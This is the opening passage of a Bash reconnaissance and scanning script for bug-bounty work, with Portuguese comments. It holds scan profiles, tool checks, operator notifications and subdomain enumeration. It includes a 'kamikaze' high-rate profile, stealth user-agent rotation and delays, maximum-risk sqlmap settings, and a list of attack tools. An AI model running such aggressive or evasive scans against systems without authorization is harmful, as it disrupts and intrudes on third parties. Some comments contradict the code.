#!/usr/bin/env bash
# bugbounty_scanner_enhanced.sh
# Enhanced automated bug-bounty reconnaissance & scanning pipeline
# MELHORADO COM PERFIS INTERATIVOS + CONTROLES DE SEGURANÇA
# Target platform: Kali Linux / Security distributions
# Author:Kirby656 & Enhanced by AI Assistant
# License: Use only on targets you are authorized to test.

# ============= AVISOS DE SEGURANÇA E ÉTICA =============
# ⚠️  IMPORTANTE: Use apenas em alvos autorizados para teste
# ⚠️  Para perfis agressivos, use VPS dedicado (não rede doméstica)  
# ⚠️  Monitore logs e ajuste rate limits conforme necessário
# ⚠️  Dry-run habilitado por padrão - use --confirm para ações ativas
# ⚠️  Toda atividade de scanning deve ter autorização prévia

set -euo pipefail
IFS=$'\n\t'

# ============= HELPER FUNCTION: NUMERIC VALIDATION =============
# Validates that a value contains only digits (prevents arithmetic errors)
ensure_numeric() {
    local value="$1"
    local default="${2:-0}"
    
    # If empty or not numeric, return default
    if [[ -z "$value" ]] || ! [[ "$value" =~ ^[0-9]+$ ]]; then
        echo "$default"
    else
        echo "$value"
    fi
}

# ============= CHECKPOINT/RESUME SYSTEM =============
CHECKPOINT_FILE=""
checkpoint() {
    local phase="$1"
    [[ -n "$CHECKPOINT_FILE" ]] && echo "$phase:$(date +%s)" >> "$CHECKPOINT_FILE"
}

is_phase_complete() {
    local phase="$1"
    [[ -n "$CHECKPOINT_FILE" ]] && grep -q "^${phase}:" "$CHECKPOINT_FILE" 2>/dev/null
}

# ============= SISTEMA DE PERFIS E CONFIGURAÇÕES =============
# Parse command line arguments
PROFILE=""
DRY_RUN=true
SKIP_CONFIRMATION=false
EXPORT_JSON=false

# Parse argumentos da linha de comando
while [[ $# -gt 0 ]]; do
    case $1 in
        --profile=*)
            PROFILE="${1#*=}"
            shift
            ;;
        --confirm|--no-dry-run)
            DRY_RUN=false
            shift
            ;;
        --yes)
            SKIP_CONFIRMATION=true
            shift
            ;;
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        --export-json)
            EXPORT_JSON=true
            shift
            ;;
        --help)
            echo "Usage: $0 [options] scope.txt"
            echo "Options:"
            echo "  --profile=PROFILE    Set profile: light, balanced, aggressive"
            echo "  --confirm            Disable dry-run mode (enable active scanning)"
            echo "  --dry-run            Enable dry-run mode (default)"
            echo "  --yes                Skip confirmation prompts"
            echo "  --export-json        Export results in JSON format"
            exit 0
            ;;
        -*)
            echo "Unknown option: $1" >&2
            exit 1
            ;;
        *)
            SCOPE_FILE="$1"
            shift
            ;;
    esac
done

# ============= PROMPT INTERATIVO DE PERFIS =============
show_profile_menu() {
    echo ""
    echo "🎯 Selecione o perfil de execução:"
    echo ""
    echo "1) light      - Seguro para rede doméstica (baixo impacto)"
    echo "   • Concorrência: 8 threads"
    echo "   • Rate limit: 20/s"
    echo "   • Timeouts conservadores"
    echo ""
    echo "2) balanced   - Recomendado para VM 8GB/4cores (padrão)" 
    echo "   • Concorrência: 20 threads"
    echo "   • Rate limit: 100/s"  
    echo "   • Timeouts médios"
    echo ""
    echo "3) aggressive - Somente VPS dedicado (alto paralelismo)"
    echo "   • Concorrência: 50 threads"
    echo "   • Rate limit: 300/s"
    echo "   • Timeouts agressivos"
    echo ""
    echo "4) kamikaze   - ⚠️  MODO BRUTAL - MÁXIMA AGRESSIVIDADE ⚠️"
    echo "   • Concorrência: 250 threads"
    echo "   • Rate limit: 1500/s"
    echo "   • Timeouts máximos (400s)"
    echo "   • 🔥 USE APENAS EM VPS DEDICADO COM AUTORIZAÇÃO 🔥"
    echo ""
    echo -n "Escolha [1-4] ou [light/balanced/aggressive/kamikaze] (Enter = balanced): "
}

# Configurar perfil interativamente se necessário
if [[ -z "$PROFILE" ]]; then
    # Usar variável de ambiente se disponível
    PROFILE="${PROFILE:-}"
    
    # Se ainda não definido e rodando em TTY, mostrar menu
    if [[ -z "$PROFILE" ]] && [[ -t 0 ]] && [[ -t 1 ]]; then
        show_profile_menu
        read -r user_input
        
        case "$user_input" in
            1|light)
                PROFILE="light"
                ;;
            2|balanced|"")
                PROFILE="balanced"
                ;;
            3|aggressive)
                PROFILE="aggressive"
                ;;
            4|kamikaze)
                PROFILE="kamikaze"
                echo ""
                echo "⚠️  ⚠️  ⚠️  MODO KAMIKAZE ATIVADO ⚠️  ⚠️  ⚠️"
                echo "🔥 Este modo é EXTREMAMENTE AGRESSIVO!"
                echo "🔥 Use APENAS em ambientes controlados com autorização!"
                echo ""
                ;;
            *)
                echo "❌ Opção inválida. Usando 'balanced' como padrão."
                PROFILE="balanced"
                ;;
        esac
    fi
fi

# Definir padrão se ainda não configurado
PROFILE="${PROFILE:-balanced}"

# ============= CONFIGURAÇÃO DOS PERFIS =============
configure_profile() {
    case "$PROFILE" in
        light)
            CONCURRENCY=8
            PARALLEL_HOSTS=2
            RATE_LIMIT=20
            TIMEOUT_PER_HOST="20s"
            NUCLEI_FLAGS="-c 5 -rate-limit 20 -timeout 5"
            MAX_CRAWL_DEPTH=1
            MAX_JS_FILES=20
            NCPU=2
            NAABU_TOP_PORTS=100
            SQLMAP_LEVEL=1
            SQLMAP_RISK=1
            SQLMAP_THREADS=1
            SQLMAP_MAX_TARGETS=20
            MASSCAN_RATE=300
            NIKTO_THREADS=1
            DIRSEARCH_THREADS=10
            XSPEAR_THREADS=1
            NMAP_TIMING=2
            ;;
        balanced)
            CONCURRENCY=35
            PARALLEL_HOSTS=6
            RATE_LIMIT=200
            TIMEOUT_PER_HOST="90s"
            NUCLEI_FLAGS="-c 40 -rate-limit 200 -timeout 12"
            MAX_CRAWL_DEPTH=6
            MAX_JS_FILES=200
            NCPU=$(nproc 2>/dev/null || echo 6)
            NAABU_TOP_PORTS=1000
            SQLMAP_LEVEL=2
            SQLMAP_RISK=1
            SQLMAP_THREADS=3
            SQLMAP_MAX_TARGETS=50
            MASSCAN_RATE=800
            NIKTO_THREADS=3
            DIRSEARCH_THREADS=20
            XSPEAR_THREADS=3
            NMAP_TIMING=3
            ;;
        aggressive)
            CONCURRENCY=150
            PARALLEL_HOSTS=30
            RATE_LIMIT=800
            TIMEOUT_PER_HOST="180s"
            NUCLEI_FLAGS="-c 150 -rate-limit 800 -timeout 18"
            MAX_CRAWL_DEPTH=8
            MAX_JS_FILES=800
            NCPU=$(nproc 2>/dev/null || echo 16)
            NAABU_TOP_PORTS=full
            SQLMAP_LEVEL=3
            SQLMAP_RISK=2
            SQLMAP_THREADS=5
            SQLMAP_MAX_TARGETS=100
            MASSCAN_RATE=2000
            NIKTO_THREADS=5
            DIRSEARCH_THREADS=30
            XSPEAR_THREADS=5
            NMAP_TIMING=4
            ;;
        kamikaze)
            # MODO KAMIKAZE - MÁXIMA BRUTALIDADE (USE COM CUIDADO!)
            CONCURRENCY=250
            PARALLEL_HOSTS=80
            RATE_LIMIT=1500
            TIMEOUT_PER_HOST="400s"
            NUCLEI_FLAGS="-c 250 -rate-limit 1500 -timeout 25"
            MAX_CRAWL_DEPTH=12
            MAX_JS_FILES=1500
            NCPU=$(nproc 2>/dev/null || echo 32)
            NAABU_TOP_PORTS=full
            SQLMAP_LEVEL=5
            SQLMAP_RISK=3
            SQLMAP_THREADS=10
            SQLMAP_MAX_TARGETS=200
            MASSCAN_RATE=5000
            NIKTO_THREADS=10
            DIRSEARCH_THREADS=50
            XSPEAR_THREADS=10
            NMAP_TIMING=5
            # Desabilitar ALL rate limits
            ulimit -n 65535 2>/dev/null || true
            ;;
        *)
            echo "❌ Perfil desconhecido: $PROFILE"
            exit 1
            ;;
    esac
}

# Configurar perfil selecionado
configure_profile

# defaults (podem vir do topo do script / PROFILE)
CONCURRENCY="${CONCURRENCY:-20}"      # padrão balanced
RATE_LIMIT="${RATE_LIMIT:-100}"
NUCLEI_TIMEOUT_SECONDS="${NUCLEI_TIMEOUT_SECONDS:-7}"

# pegar help do nuclei (sem caracteres estranhos)
unalias nuclei 2>/dev/null || true
NUCLEI_HELP="$(nuclei -h 2>&1 || true)"
# fallback se nuclei não instalado: NUCLEI_HELP vazio

# detectar flags suportadas
NUCLEI_CONC_FLAG=""
NUCLEI_RL_FLAG=""
NUCLEI_TO_FLAG=""

if grep -qE '(^|[[:space:]])(-concurrency|--concurrency)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  NUCLEI_CONC_FLAG="-concurrency"
elif grep -qE '(^|[[:space:]])(-c[[:space:]]| -c$| -c,|^ -c)' <<<"$NUCLEI_HELP"; then
  NUCLEI_CONC_FLAG="-c"
fi

if grep -qE '(^|[[:space:]])(-rl|--rate-limit|--rl)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  # some versions use -rl, some use -rate-limit
  if grep -qE '(^|[[:space:]])-rl([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
    NUCLEI_RL_FLAG="-rl"
  else
    NUCLEI_RL_FLAG="-rate-limit"
  fi
fi

if grep -qE '(^|[[:space:]])(-timeout|--timeout)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  NUCLEI_TO_FLAG="-timeout"
fi

# Build an array of nuclei args (safe splitting, no quoting issues)
build_nuclei_args() {
  local -n _arr=$1   # name ref to return array
  _arr=()

  # allow override via env var NUCLEI_FLAGS_PRESET (string) if user set it
  if [[ -n "${NUCLEI_FLAGS_PRESET:-}" ]]; then
    read -r -a preset_tokens <<< "${NUCLEI_FLAGS_PRESET}"
    for t in "${preset_tokens[@]}"; do
      _arr+=("$t")
    done
  else
    # add concurrency if supported
    if [[ -n "$NUCLEI_CONC_FLAG" ]]; then
      _arr+=("$NUCLEI_CONC_FLAG" "$CONCURRENCY")
    fi
    # add rate limit if supported
    if [[ -n "$NUCLEI_RL_FLAG" ]]; then
      _arr+=("$NUCLEI_RL_FLAG" "$RATE_LIMIT")
    fi
    # add timeout if supported (nuclei supports seconds or duration)
    if [[ -n "$NUCLEI_TO_FLAG" ]]; then
      _arr+=("$NUCLEI_TO_FLAG" "$NUCLEI_TIMEOUT_SECONDS")
    fi
  fi

  # Don't add -silent automatically to allow verbose output
  # _arr+=("-silent")
}

# Build extended flags array (if you want different presets for extended runs)
build_nuclei_args NUCLEI_ARGS
NUCLEI_FLAGS_EXT_PRESET="${NUCLEI_FLAGS_EXT_PRESET:-}"
if [[ -n "$NUCLEI_FLAGS_EXT_PRESET" ]]; then
  read -r -a tmp <<< "$NUCLEI_FLAGS_EXT_PRESET"
  NUCLEI_ARGS_EXT=("${tmp[@]}")
else
  NUCLEI_ARGS_EXT=("${NUCLEI_ARGS[@]}")
fi

# ============= CONFIGURAÇÕES ADICIONAIS =============
OUTDIR="results_$(date +%Y%m%d_%H%M%S)"
SCOPE_FILE="${SCOPE_FILE:-}"
CHAOS_KEY=${CHAOS_KEY:-""}
SAVE_JS=true

# ============= STEALTH MODE E USER-AGENT ROTATION =============
# Stealth mode: 0=disabled, 1=light (5-15s), 2=aggressive (15-45s)
STEALTH_MODE="${STEALTH_MODE:-0}"
[[ "$PROFILE" = "light" ]] && STEALTH_MODE=1

# Pool de User-Agents realistas para rotação
USER_AGENT_POOL=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0"
)

# Função para obter User-Agent aleatório
get_random_ua() {
    echo "${USER_AGENT_POOL[$RANDOM % ${#USER_AGENT_POOL[@]}]}"
}

# Função de delay inteligente para stealth
stealth_delay() {
    if [[ "$STEALTH_MODE" = "1" ]]; then
        local wait_time=$(shuf -i 5-15 -n 1)
        sleep "$wait_time"
    elif [[ "$STEALTH_MODE" = "2" ]]; then
        local wait_time=$(shuf -i 15-45 -n 1)
        sleep "$wait_time"
    fi
}

USER_AGENT="$(get_random_ua)"  # Define UA inicial
THROTTLE_CMD="${THROTTLE_CMD:-}"

# Timeouts/limites específicos (configuráveis via env)
TIMEOUT_PER_CALL="${TIMEOUT_PER_CALL:-60s}"  # timeout por URL no download de JS

# TELEGRAM CONFIG
TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
INSTANCE_ID="$(hostname)_$$_$(date +%s%N | cut -b1-13)"
TELEGRAM_QUEUE_DIR="/tmp/telegram_queue_${USER:-root}"
TELEGRAM_LAST_SEND_FILE="/tmp/telegram_last_send_${USER:-root}"

# DISCORD CONFIG (use environment variable - no hardcoded URLs)
DISCORD_WEBHOOK="${DISCORD_WEBHOOK:-}"
DISCORD_LAST_SEND_FILE="/tmp/discord_last_send_${USER:-root}"

# Mostrar configuração selecionada
echo ""
echo "🔧 Configuração selecionada:"
echo "   Perfil: $PROFILE"
echo "   Concorrência: $CONCURRENCY"
echo "   Hosts paralelos: $PARALLEL_HOSTS"
echo "   Rate limit: $RATE_LIMIT/s"
echo "   Timeout por host: $TIMEOUT_PER_HOST"
echo "   Max JS files: $MAX_JS_FILES"
echo "   CPUs: $NCPU"
echo "   Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""

# ============= CONFIRMAÇÃO FINAL =============
if [[ "$DRY_RUN" = "false" ]] && [[ "$SKIP_CONFIRMATION" = "false" ]]; then
    echo "⚠️  ATENÇÃO: Modo ATIVO selecionado!"
    echo "   Isso executará varreduras ativas (nuclei, naabu, sqlmap, etc.)"
    echo "   Certifique-se de ter autorização para testar os alvos."
    echo ""
    echo -n "Continuar com scanning ativo? [y/N]: "
    read -r confirmation
    
    if [[ ! "$confirmation" =~ ^[Yy]$ ]]; then
        echo "❌ Cancelado pelo usuário."
        exit 0
    fi
fi

# ============= FERRAMENTAS APRIMORADAS =============
# Função para detectar getJS com variações de nome e PATH - Correção: movida para antes de check_tools()
detect_getjs() {
    local getjs_bin=""
    
    # Tentar diferentes variações do nome do binário
    for variant in getJS getjs GetJS GetJs; do
        if command -v "$variant" >/dev/null 2>&1; then
            getjs_bin="$variant"
            break
        fi
    done
    
    # Se não encontrou, verificar em $GOPATH/bin
    if [[ -z "$getjs_bin" ]] && [[ -n "$GOPATH" ]]; then
        for variant in getJS getjs GetJS GetJs; do
            if [[ -x "$GOPATH/bin/$variant" ]]; then
                getjs_bin="$GOPATH/bin/$variant"
                break
            fi
        done
    fi
    
    # Verificar também /usr/local/bin
    if [[ -z "$getjs_bin" ]]; then
        for variant in getJS getjs GetJS GetJs; do
            if [[ -x "/usr/local/bin/$variant" ]]; then
                getjs_bin="/usr/local/bin/$variant"
                break
            fi
        done
    fi
    
    echo "$getjs_bin"
}

REQUIRED_TOOLS=(subfinder httpx nuclei jq curl wget)
OPTIONAL_TOOLS=(amass findomain naabu gau waybackurls hakrawler katana gf qsreplace dalfox sqlmap gospider getjs aria2c massdns subjack wafw00f)
# Removido: ffuf dirsearch gobuster (bruteforce tools - contra princípios de bug bounty)

# ============= EXTRA TOOLS ARRAY - MODO BRUTAL =============
EXTRA_TOOLS=(
    kxss linkfinder paramspider arjun 
    secretfinder trufflehog gitleaks git-dumper commix 
    lfisuite smuggler ssrfmap httprobe gowitness aquatone 
    s3scanner cloud_enum wafw00f
    nikto dirsearch dirb gobuster testssl.sh XSpear xspear
    nmap whatweb msfconsole
)

check_tools() {
    local missing_required=()
    local missing_optional=()
    
    echo "🔍 Verificando ferramentas..."
    
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_required+=("$tool")
        fi
    done
    
    for tool in "${OPTIONAL_TOOLS[@]}"; do
        # Correção: tratar getjs especialmente usando detecção melhorada
        if [[ "$tool" == "getjs" ]]; then
            if [[ -z "$(detect_getjs)" ]]; then
                missing_optional+=("$tool")
            fi
        elif ! command -v "$tool" >/dev/null 2>&1; then
            missing_optional+=("$tool")
        fi
    done
    
    if [[ ${#missing_required[@]} -gt 0 ]]; then
        echo "❌ Ferramentas obrigatórias faltando: ${missing_required[*]}"
        echo "   Instale e execute novamente."
        exit 1
    fi
    
    if [[ ${#missing_optional[@]} -gt 0 ]]; then
        echo "⚠️  Ferramentas opcionais faltando: ${missing_optional[*]}"
        echo "   Continuando sem elas..."
    fi
    
    echo "✅ Verificação de ferramentas completa"
}

check_tools

# Validate scope file
if [[ -z "$SCOPE_FILE" ]] || [[ ! -f "$SCOPE_FILE" ]]; then
    echo "Usage: $0 [options] scope.txt"
    echo "scope.txt deve conter um domínio por linha (exemplo.com)" >&2
    exit 1
fi

# ============= ESTRUTURA DE DIRETÓRIOS MELHORADA =============
setup_directories() {
    mkdir -p "$OUTDIR"
    cd "$OUTDIR" || exit 1
    
    # Criar estrutura completa de diretórios incluindo para EXTRA_TOOLS e Burp Suite
    mkdir -p raw subs alive tech ports urls js js/downloads nuclei nuclei/burp_scan poc poc/notes reports html logs apis secrets endpoints
    mkdir -p logs/{subdomain,httpx,nuclei,sqlmap,crawling,extra_tools,xss,burp}
    mkdir -p reports/{kxss,linkfinder,paramspider,arjun,secretfinder,trufflehog,gitleaks,git_dumper,commix,lfisuite,smuggler,ssrfmap,httprobe,gowitness,aquatone,s3scanner,cloud_enum}
    mkdir -p screenshots/{gowitness,aquatone}
    
    # Criar diretórios para funções avançadas (script2)
    mkdir -p graphql params tokens/analysis takeover cors ssrf correlation
    
    cp "$OLDPWD/$SCOPE_FILE" scope.txt
    
    echo "📁 Estrutura de diretórios criada em: $(pwd)"
}

setup_directories

# ============= FUNÇÕES UTILITÁRIAS MELHORADAS =============
safe_count() {
    local file="$1"
    if [[ -f "$file" ]] && [[ -s "$file" ]]; then
        wc -l < "$file" | tr -d ' \n'
    else
        echo "0"
    fi
}

log_info() {
    local message="$*"
    echo "[$(date '+%H:%M:%S')] $message" | tee -a logs/scanner.log
}

log_error() {
    local message="$*" 
    echo "[$(date '+%H:%M:%S')] ERROR: $message" >&2 | tee -a logs/errors.log
}

log_section() {
    echo ""
    echo "=========================================="
    echo "  $1"
    echo "=========================================="
}

log_success() {
    echo "[$(date '+%H:%M:%S')] ✅ $1" | tee -a logs/scanner.log
}

log_warn() {
    echo "[$(date '+%H:%M:%S')] ⚠️  $1" | tee -a logs/scanner.log
}

# ============= FUNÇÕES DO TELEGRAM APRIMORADAS =============
init_telegram_queue() {
    mkdir -p "$TELEGRAM_QUEUE_DIR" 2>/dev/null || true
    touch "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

telegram_rate_limit() {
    local min_interval=2
    local last_send=0
    
    if [[ -f "$TELEGRAM_LAST_SEND_FILE" ]]; then
        last_send=$(cat "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || echo 0)
    fi
    
    local current_time=$(date +%s)
    local time_diff=$((current_time - last_send))
    
    if [[ "$time_diff" -lt "$min_interval" ]]; then
        local sleep_time=$((min_interval - time_diff + 1))
        sleep "$sleep_time"
    fi
    
    echo "$current_time" > "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

send_telegram_message_enhanced() {
    local message="$1"
    local urgent="${2:-false}"
    local max_retries=3
    local retry_count=0
    
    if [[ -z "$TELEGRAM_BOT_TOKEN" ]] || [[ -z "$TELEGRAM_CHAT_ID" ]]; then
        return 0
    fi
    
    # Rate limiting
    telegram_rate_limit
    
    # Add instance identifier
    local instance_suffix="
🔧 Instance: \`${INSTANCE_ID:0:8}...\`"
    local formatted_message="$message$instance_suffix"
    
    while [[ "$retry_count" -lt "$max_retries" ]]; do
        if curl -s -m 15 -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
             -d parse_mode="Markdown" \
             -d text="$formatted_message" >/dev/null 2>&1; then
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Telegram send failed (attempt $retry_count/$max_retries)"
        
        local backoff=$(( (2 ** retry_count) + (RANDOM % 3) ))
        sleep "$backoff"
    done
    
    log_error "Failed to send Telegram message after $max_retries attempts"
    return 0
}

send_telegram_status() {
    local message="$1"
    local urgent="${2:-false}"
    
    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
        local emoji="📊"
        [[ "$urgent" = "true" ]] && emoji="🚨"
        
        local formatted_message="${emoji} *Bug Bounty Scanner*
📁 \`$(basename "$(pwd)")\`
🕐 \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` $([ "$DRY_RUN" = "true" ] && echo "(DRY-RUN)" || echo "(ATIVO)")

$message"
        
        send_telegram_message_enhanced "$formatted_message" "$urgent"
    fi
}

# ============= FUNÇÕES DO DISCORD =============
init_discord() {
    touch "$DISCORD_LAST_SEND_FILE" 2>/dev/null || true
}

discord_rate_limit() {
    local min_interval=2
    local last_send=0
    
    if [[ -f "$DISCORD_LAST_SEND_FILE" ]]; then
        last_send=$(cat "$DISCORD_LAST_SEND_FILE" 2>/dev/null || echo 0)
    fi
    
    local current_time=$(date +%s)
    local time_diff=$((current_time - last_send))
    
    if [[ "$time_diff" -lt "$min_interval" ]]; then
        local sleep_time=$((min_interval - time_diff + 1))
        sleep "$sleep_time"
    fi
    
    echo "$current_time" > "$DISCORD_LAST_SEND_FILE" 2>/dev/null || true
}

send_discord_message() {
    local message="$1"
    local urgent="${2:-false}"
    local max_retries=3
    local retry_count=0
    
    if [[ -z "$DISCORD_WEBHOOK" ]]; then
        return 0
    fi
    
    # Rate limiting
    discord_rate_limit
    
    # Add instance identifier
    local formatted_message="$message

🔧 Instance: \`${INSTANCE_ID:0:8}...\`"
    
    # Determinar cor do embed (verde, amarelo, vermelho)
    local color="3447003"  # Azul padrão
    [[ "$urgent" = "true" ]] && color="15158332"  # Vermelho
    
    local json_payload=$(jq -n \
        --arg content "$formatted_message" \
        --arg color "$color" \
        '{
            "content": $content,
            "embeds": [{
                "color": ($color | tonumber),
                "timestamp": (now | strftime("%Y-%m-%dT%H:%M:%S.000Z"))
            }]
        }')
    
    while [[ "$retry_count" -lt "$max_retries" ]]; do
        if curl -s -m 15 -X POST "$DISCORD_WEBHOOK" \
             -H "Content-Type: application/json" \
             -d "$json_payload" >/dev/null 2>&1; then
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Discord send failed (attempt $retry_count/$max_retries)"
        
        local backoff=$(( (2 ** retry_count) + (RANDOM % 3) ))
        sleep "$backoff"
    done
    
    log_error "Failed to send Discord message after $max_retries attempts"
    return 0
}

send_discord_status() {
    local message="$1"
    local urgent="${2:-false}"
    
    if [[ -n "$DISCORD_WEBHOOK" ]]; then
        local emoji="📊"
        [[ "$urgent" = "true" ]] && emoji="🚨"
        
        local formatted_message="${emoji} **Bug Bounty Scanner**
📁 \`$(basename "$(pwd)")\`
🕐 \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` $([ "$DRY_RUN" = "true" ] && echo "(DRY-RUN)" || echo "(ATIVO)")

$message"
        
        send_discord_message "$formatted_message" "$urgent"
    fi
}

send_notification() {
    local message="$1"
    local urgent="${2:-false}"
    
    # Enviar para ambos os canais se configurados
    send_telegram_status "$message" "$urgent"
    send_discord_status "$message" "$urgent"
}

# ============= PROCESSAMENTO DE ESCOPO MELHORADO =============
process_scope() {
    log_info "Processando escopo e tratando wildcards..."
    while read -r line; do
        # Skip comments and empty lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${line// }" ]] && continue
        
        line=$(echo "$line" | tr '[:upper:]' '[:lower:]' | sed 's/[[:space:]]*$//')
        
        # Handle wildcards
        if [[ "$line" =~ \* ]]; then
            log_info "Wildcard detectado: $line - Convertendo para domínio base"
            base_domain=$(echo "$line" | sed 's/.*\*\.//g')
            if [[ "$base_domain" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$base_domain"
                log_info "Convertido wildcard $line para: $base_domain"
            else
                log_error "Formato inválido de wildcard: $line - ignorando"
            fi
        else
            # Validate normal domain
            if [[ "$line" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$line"
            else
                log_error "Formato inválido de domínio: $line - ignorando"
            fi
        fi
    done < scope.txt
}

# Initialize Telegram and Discord
init_telegram_queue
init_discord

# ============= INÍCIO DO SCANNER =============
send_notification "🚀 *INICIANDO SCAN*
🎯 Escopo: \`$(basename "$SCOPE_FILE")\`
📍 Diretório: \`$OUTDIR\`
⚙️ Configurações:
- Perfil: $PROFILE
- Threads: $CONCURRENCY
- Rate Limit: $RATE_LIMIT/s
- Depth: $MAX_CRAWL_DEPTH
- Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")"

# Processar escopo
process_scope | sort -u > raw/scope.clean.txt

log_info "Output dir: $(pwd)"
log_info "Domínios válidos processados: $(safe_count raw/scope.clean.txt)"

# Verificar se temos domínios válidos
if [[ ! -s raw/scope.clean.txt ]]; then
    log_error "Nenhum domínio válido encontrado no escopo!"
    send_notification "❌ *ERRO CRÍTICO*
Nenhum domínio válido encontrado no escopo!" true
    exit 1
fi

TOTAL_DOMAINS=$(safe_count raw/scope.clean.txt)

# ============= INICIALIZAR VARIÁVEIS DE ESTATÍSTICAS =============
SUBS_FOUND=0
LIVE_HOSTS=0
PORTS_FOUND=0
HOSTS_WITH_PORTS=0
TOTAL_URLS=0
PARAM_URLS=0
JS_FILES=0
JS_DOWNLOADED=0
API_ENDPOINTS=0
NUCLEI_FAST_COUNT=0
NUCLEI_FAST_URLS=0
NUCLEI_FAST_TOTAL=0
NUCLEI_EXT_COUNT=0
NUCLEI_EXT_TOTAL=0
DALFOX_RESULTS=0
SQLI_VALIDATED=0
TOTAL_SECRETS=0
XSS_CANDIDATES=0
SQLI_CANDIDATES=0
LFI_CANDIDATES=0
SSRF_CANDIDATES=0
KXSS_RESULTS=0
LINKFINDER_ENDPOINTS=0
PARAMSPIDER_PARAMS=0
SECRETFINDER_SECRETS=0
GOWITNESS_SCREENSHOTS=0
AQUATONE_SCREENSHOTS=0
S3_BUCKETS=0
BURP_VULNS=0
X8_PARAMS=0
CRLF_FINDINGS=0
DNSX_RECORDS=0
JAELES_FINDINGS=0
UNFURL_DOMAINS=0
SHODAN_INTEL=0
CENSYS_INTEL=0
URO_CLEANED=0
INTERACTSH_OAST=0

send_notification "✅ *Escopo processado*
📋 $TOTAL_DOMAINS domínios válidos encontrados"

# ============= FASE 1: ENUMERAÇÃO DE SUBDOMÍNIOS MELHORADA =============
echo ""
echo "========== FASE 1: ENUMERAÇÃO DE SUBDOMÍNIOS =========="
send_notification "🔍 *FASE 1: SUBDOMAIN ENUMERATION*
Iniciando descoberta com múltiplas ferramentas..."

subdomain_enumeration() {
    log_info "Iniciando enumeração de subdomínios..."
    
    # Subfinder com MÁXIMAS SOURCES + API keys if available
    if command -v subfinder >/dev/null 2>&1; then
        log_info "Executando subfinder com TODAS as sources disponíveis..."
        timeout 20m subfinder -dL raw/scope.clean.txt \
            -all -recursive -max-time 20 \
            -sources certspotter,crtsh,hackertarget,threatcrowd,virustotal,chaos,rapiddns,alienvault,binaryedge,bufferover,c99,censys,chinaz,commoncrawl,dnsdumpster,dnsdb,fofa,fullhunt,github,google,hunter,intelx,passivetotal,quake,riddler,securitytrails,shodan,sitedossier,sublist3r,threatbook,urlscan,waybackarchive,whoisxmlapi,zoomeye \
            -silent -o raw/subfinder.txt 2>/dev/null || true &
    fi
    
    # Amass PASSIVE ONLY (sem bruteforce para respeitar princípios de bug bounty)
    if command -v amass >/dev/null 2>&1; then
        log_info "Executando amass (passive only - sem bruteforce)..."
        # Passive apenas
        timeout 20m amass enum -passive -df raw/scope.clean.txt -o raw/amass_passive.txt 2>/dev/null || true &
        
        # Active mode SEM bruteforce (apenas se não for dry-run)
        if [[ "$DRY_RUN" = "false" ]]; then
            timeout 40m amass enum -active \
                -df raw/scope.clean.txt \
                -max-dns-queries 10000 \
                -o raw/amass_active.txt 2>/dev/null || true &
        fi
    fi
    
    # Assetfinder - Descoberta adicional
    if command -v assetfinder >/dev/null 2>&1; then
        log_info "Executando assetfinder..."
        timeout 10m cat raw/scope.clean.txt | assetfinder --subs-only > raw/assetfinder.txt 2>/dev/null || true &
    fi
    
    # Findomain
    if command -v findomain >/dev/null 2>&1; then
        log_info "Executando findomain..."
        timeout 5m findomain -tL raw/scope.clean.txt -u raw/findomain.txt 2>/dev/null || true &
    fi
    
    # Chaos (se disponível)
    if [[ -n "$CHAOS_KEY" ]] && command -v chaos >/dev/null 2>&1; then
        log_info "Executando chaos..."
